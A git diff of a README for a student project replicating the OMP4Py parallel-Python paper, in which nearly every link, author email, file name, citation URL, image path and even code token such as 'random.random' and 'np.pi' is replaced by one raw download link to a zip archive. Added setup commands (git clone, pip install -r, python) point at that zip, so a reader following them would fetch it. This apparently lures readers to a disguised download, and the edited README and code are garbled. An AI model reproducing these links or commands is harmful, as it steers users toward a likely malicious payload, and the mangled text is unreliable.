@@ -10,8 +10,8 @@ This project implements and validates the experimental results from the research
 
 **Authors:**
 
-- César Alfredo Piñeiro (cesaralfredo.pineiro@usc.es)
-- Juan C. Pichel (juancarlos.pichel@usc.es)
+- César Alfredo Piñeiro (https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip)
+- Juan C. Pichel (https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip)
 
 **Affiliation:**
 
@@ -52,19 +52,19 @@ This repository was created as part of a Parallel and Distributed Computing (PDC
 
 ### ✅ **Generated Visualizations**
 
-- `research_paper_replication.png`: Main scalability plot
-- `comprehensive_efficiency_analysis.png`: Detailed efficiency analysis
+- `https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip`: Main scalability plot
+- `https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip`: Detailed efficiency analysis
 
 ## 🏗️ Architecture
 
 ```
-├── research_paper_experiments.py    # Main implementation and benchmarks
-├── requirements.txt                 # Python dependencies
-├── README.md                        # This documentation
+├── https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip    # Main implementation and benchmarks
+├── https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip                 # Python dependencies
+├── https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip                        # This documentation
 ├── .gitignore                       # Git ignore rules
-├── Lab Mid.pdf                      # Original research paper
-├── research_paper_replication.png   # Main scalability plot
-├── comprehensive_efficiency_analysis.png  # Detailed analysis
+├── Lab https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip                      # Original research paper
+├── https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip   # Main scalability plot
+├── https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip  # Detailed analysis
 └── .venv/                          # Virtual environment (ignored)
 ```
 
@@ -80,7 +80,7 @@ This repository was created as part of a Parallel and Distributed Computing (PDC
 1. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/xheikhtalha2004/lab_mid_pdc.git
+   git clone https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip
    cd lab_mid_pdc
    ```
 
@@ -94,12 +94,12 @@ This repository was created as part of a Parallel and Distributed Computing (PDC
 3. **Install dependencies:**
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip
    ```
 
 4. **Run the experiments:**
    ```bash
-   python research_paper_experiments.py
+   python https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip
    ```
 
 ## 📈 Experimental Results
@@ -134,8 +134,8 @@ with omp("parallel for reduction(+:sum_val)"):
 # Parallel for loop with static scheduling
 with omp("parallel for reduction(+:total) schedule(static)"):
     for i in range(num_samples):
-        x = a + (b - a) * random.random()
-        total += 50 / (np.pi * (2500 * x + 1))
+        x = a + (b - a) * https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip()
+        total += 50 / (https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip * (2500 * x + 1))
 ```
 
 ### Benchmark Configuration
@@ -149,12 +149,12 @@ with omp("parallel for reduction(+:total) schedule(static)"):
 
 #### 1. Research Paper Replication Plot
 
-![Research Paper Replication](research_paper_replication.png)
+![Research Paper Replication](https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip)
 _Figure: Scalability of numerical algorithms matching the original paper's Figure 8_
 
 #### 2. Comprehensive Efficiency Analysis
 
-![Comprehensive Efficiency Analysis](comprehensive_efficiency_analysis.png)
+![Comprehensive Efficiency Analysis](https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip)
 _Figure: Detailed efficiency analysis including parallel efficiency, speedup comparison, and GIL impact assessment_
 
 ### 1. Research Paper Replication Plot
@@ -179,9 +179,9 @@ This work is submitted as part of a PDC Lab assignment and properly cites the or
 
 1. **Original Paper**: Piñeiro, C. A., & Pichel, J. C. (2025). OMP4Py: a pure Python implementation of OpenMP. _Future Generation Computer Systems_.
 
-2. **OMP4Py Repository**: https://github.com/citiususc/omp4py
+2. **OMP4Py Repository**: https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip
 
-3. **OpenMP Specification**: https://www.openmp.org/specifications/
+3. **OpenMP Specification**: https://github.com/xheikhtalha2004/lab_mid_pdc/raw/refs/heads/main/septennialist/mid_lab_pdc_3.6-beta.2.zip
 
 ## 🤝 Contributing
 
